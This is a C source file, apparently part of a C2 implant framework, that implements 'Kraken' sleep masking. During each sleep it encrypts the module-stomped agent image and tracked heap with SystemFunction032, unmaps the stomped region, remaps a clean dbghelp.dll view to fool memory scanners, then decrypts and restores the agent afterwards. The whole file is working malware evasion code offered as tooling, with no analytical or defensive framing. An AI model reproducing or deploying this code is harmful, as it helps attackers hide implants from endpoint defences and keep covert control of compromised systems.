/*
 * sleep_kraken_adv - clean-image unmap/remap sleep.
 *
 * PICO backs up the phantom image, encrypts the backup and tracked heap,
 * remaps clean dbghelp.dll for the sleep window, then restores the agent.
 * The existing agent thread runs this code and remains image-backed.
 */
#include <windows.h>
#include "memory.h"
#include "mask.h"

#define KRAKEN_KEY_LEN 16
#define VP_CHUNK       0x2000

typedef struct {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} USTRING;

typedef LONG (WINAPI * FN_SystemFunction032)(USTRING *, USTRING *);
typedef BOOL (WINAPI * FN_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef DWORD (WINAPI * FN_WaitForSingleObjectEx)(HANDLE, DWORD, BOOL);
typedef LONG (NTAPI * FN_NtUnmapViewOfSection)(HANDLE, PVOID);
typedef LONG (NTAPI * FN_NtMapViewOfSection)(
    HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T, PLARGE_INTEGER,
    PSIZE_T, DWORD, ULONG, ULONG);

typedef struct {
    FN_SystemFunction032     crypt;
    FN_VirtualProtect        protect;
    FN_WaitForSingleObjectEx wait;
    FN_NtUnmapViewOfSection  unmap;
    FN_NtMapViewOfSection    map;

    HANDLE waitHandle;
    DWORD  milliseconds;
    DWORD  waitResult;

    HANDLE hSection;
    PVOID  imageBase;
    PVOID  stompStart;
    SIZE_T stompSize;
    PVOID  backup;

    MEMORY_SECTION sections[MAX_SECTIONS];
    SIZE_T sectionCount;
    HEAP_RECORD * heapRecords;
    SIZE_T heapCount;

    BYTE key[KRAKEN_KEY_LEN];
} KRAKEN_PARAMS;

extern MEMORY_LAYOUT g_memory;

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateEventA(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetCurrentThreadId(VOID);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(VOID);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT VOID   WINAPI KERNEL32$GetSystemTimeAsFileTime(LPFILETIME);
DECLSPEC_IMPORT LONG   NTAPI NTDLL$NtDelayExecution(BOOLEAN, PLARGE_INTEGER);

void mask_memory(MEMORY_LAYOUT * memory, BOOL mask)
{
    (void) memory;
    (void) mask;
}

void adv_stomp_bof_vp_handler(LPVOID address, DWORD protect)
{
    (void) address;
    (void) protect;
}

/* PICO stays mapped while the agent image is replaced. */
static BOOL run_kraken(KRAKEN_PARAMS * p)
{
    USTRING data;
    USTRING key;
    SIZE_T i;
    DWORD old;
    PVOID base;
    SIZE_T viewSize;
    LONG status;

    for (i = 0; i < p->stompSize; i++)
        ((BYTE *) p->backup)[i] = ((BYTE *) p->stompStart)[i];

    key.Buffer = p->key;
    key.Length = key.MaximumLength = KRAKEN_KEY_LEN;
    data.Buffer = p->backup;
    data.Length = data.MaximumLength = (DWORD) p->stompSize;
    p->crypt(&data, &key);

    for (i = 0; i < p->heapCount; i++) {
        HEAP_RECORD * record = &p->heapRecords[i];
        if (record->Address == NULL || record->Size == 0)
            continue;
        data.Buffer = record->Address;
        data.Length = data.MaximumLength = (DWORD) record->Size;
        p->crypt(&data, &key);
    }

    status = p->unmap((HANDLE)(LONG_PTR) -1, p->imageBase);
    if (status < 0)
        goto decrypt_fail;

    base = p->imageBase;
    viewSize = 0;
    status = p->map(
        p->hSection, (HANDLE)(LONG_PTR) -1, &base,
        0, 0, NULL, &viewSize, 2, 0, PAGE_READONLY);
    if (status < 0 || base != p->imageBase)
        goto heap_fail;

    p->waitResult = p->wait(p->waitHandle, p->milliseconds, FALSE);

    data.Buffer = p->backup;
    data.Length = data.MaximumLength = (DWORD) p->stompSize;
    p->crypt(&data, &key);

    for (i = 0; i < p->heapCount; i++) {
        HEAP_RECORD * record = &p->heapRecords[i];
        if (record->Address == NULL || record->Size == 0)
            continue;
        data.Buffer = record->Address;
        data.Length = data.MaximumLength = (DWORD) record->Size;
        p->crypt(&data, &key);
    }

    for (i = 0; i < p->stompSize; i += VP_CHUNK) {
        SIZE_T chunk = p->stompSize - i;
        if (chunk > VP_CHUNK)
            chunk = VP_CHUNK;
        if (!p->protect((BYTE *) p->stompStart + i, chunk, PAGE_READWRITE, &old))
            goto restore_fail;
    }

    for (i = 0; i < p->stompSize; i++)
        ((BYTE *) p->stompStart)[i] = ((BYTE *) p->backup)[i];

    for (i = 0; i < p->sectionCount; i++) {
        MEMORY_SECTION * section = &p->sections[i];
        if (section->BaseAddress == NULL || section->Size == 0)
            continue;
        p->protect(section->BaseAddress, section->Size,
                   section->CurrentProtect, &old);
    }

    return TRUE;

decrypt_fail:
    data.Buffer = p->backup;
    data.Length = data.MaximumLength = (DWORD) p->stompSize;
    p->crypt(&data, &key);

    for (i = 0; i < p->heapCount; i++) {
        HEAP_RECORD * record = &p->heapRecords[i];
        if (record->Address == NULL || record->Size == 0)
            continue;
        data.Buffer = record->Address;
        data.Length = data.MaximumLength = (DWORD) record->Size;
        p->crypt(&data, &key);
    }
    return FALSE;

heap_fail:
    for (i = 0; i < p->heapCount; i++) {
        HEAP_RECORD * record = &p->heapRecords[i];
        if (record->Address == NULL || record->Size == 0)
            continue;
        data.Buffer = record->Address;
        data.Length = data.MaximumLength = (DWORD) record->Size;
        p->crypt(&data, &key);
    }
restore_fail:
    return FALSE;
}

static void fill_key(BYTE * key)
{
    FILETIME time;
    DWORD state;

    KERNEL32$GetSystemTimeAsFileTime(&time);
    state = time.dwLowDateTime ^ time.dwHighDateTime ^
            KERNEL32$GetCurrentThreadId();
    for (DWORD i = 0; i < KRAKEN_KEY_LEN; i++) {
        state = state * 1103515245u + 12345u;
        key[i] = (BYTE)(state >> 16);
    }
}

static FN_SystemFunction032 resolve_crypt()
{
    HMODULE module = KERNEL32$GetModuleHandleA("advapi32.dll");
    if (module == NULL)
        module = KERNEL32$LoadLibraryA("advapi32.dll");
    if (module == NULL)
        return NULL;
    return (FN_SystemFunction032) KERNEL32$GetProcAddress(
        module, "SystemFunction032");
}

static void real_sleep(DWORD milliseconds)
{
    LARGE_INTEGER delay;
    delay.QuadPart = -((LONGLONG) milliseconds * 10000LL);
    NTDLL$NtDelayExecution(FALSE, &delay);
}

static DWORD short_sleep_floor(DWORD milliseconds)
{
    if (milliseconds < 1500 && milliseconds < 30)
        return 30;
    return milliseconds;
}

static BOOL init_advanced(MEMORY_LAYOUT * memory)
{
    ADV_STOMP_DATA * adv = (ADV_STOMP_DATA *) memory->AdvStompData;

    if (adv == NULL || adv->hSacSection == NULL ||
        adv->pStompStart == NULL || adv->szStomp == 0)
        return FALSE;

    adv->szBackup = adv->szStomp;
    adv->pBackup = KERNEL32$HeapAlloc(
        KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, adv->szBackup);
    if (adv->pBackup == NULL)
        return FALSE;

    adv->pfnBofVpHook = adv_stomp_bof_vp_handler;
    return TRUE;
}

BOOL kraken_wait(MEMORY_LAYOUT * memory, HANDLE handle,
                 DWORD milliseconds, PDWORD result)
{
    ADV_STOMP_DATA * adv = (ADV_STOMP_DATA *) memory->AdvStompData;
    KRAKEN_PARAMS params = { 0 };
    HMODULE k32;
    HMODULE ntdll;
    BOOL ok = FALSE;

    if (adv == NULL)
        return FALSE;
    if (adv->pBackup == NULL) {
        if (!init_advanced(memory))
            return FALSE;
    }
    if (adv->pBackup == NULL || adv->szBackup != adv->szStomp)
        return FALSE;

    k32 = KERNEL32$GetModuleHandleA("kernel32.dll");
    ntdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    if (k32 == NULL || ntdll == NULL)
        return FALSE;

    params.crypt = resolve_crypt();
    params.protect = (FN_VirtualProtect) KERNEL32$GetProcAddress(
        k32, "VirtualProtect");
    params.wait = (FN_WaitForSingleObjectEx) KERNEL32$GetProcAddress(
        k32, "WaitForSingleObjectEx");
    params.unmap = (FN_NtUnmapViewOfSection) KERNEL32$GetProcAddress(
        ntdll, "NtUnmapViewOfSection");
    params.map = (FN_NtMapViewOfSection) KERNEL32$GetProcAddress(
        ntdll, "NtMapViewOfSection");

    if (params.crypt == NULL || params.protect == NULL ||
        params.wait == NULL || params.unmap == NULL ||
        params.map == NULL)
        return FALSE;

    params.waitHandle   = handle;
    params.milliseconds = milliseconds;
    params.hSection     = adv->hSacSection;
    params.imageBase    = adv->pSacDllBase;
    params.stompStart   = adv->pStompStart;
    params.stompSize    = adv->szStomp;
    params.backup       = adv->pBackup;
    params.sectionCount = memory->Dll.Count;
    params.heapRecords  = memory->Heap.Records;
    params.heapCount    = memory->Heap.Count;
    fill_key(params.key);

    for (SIZE_T i = 0; i < params.sectionCount; i++)
        params.sections[i] = memory->Dll.Sections[i];

    ok = run_kraken(&params);
    if (ok && result != NULL)
        *result = params.waitResult;

    return ok;
}

VOID WINAPI _KrakenSleep(DWORD milliseconds)
{
    if (milliseconds >= 1500 && g_memory.DllAllocMethod == ALLOC_MODULESTOMP) {
        HANDLE never = KERNEL32$CreateEventA(NULL, TRUE, FALSE, NULL);
        DWORD result;

        if (never != NULL) {
            BOOL ok = kraken_wait(
                &g_memory, never, milliseconds, &result);
            KERNEL32$CloseHandle(never);
            if (ok)
                return;
        }
    }

    real_sleep(short_sleep_floor(milliseconds));
}
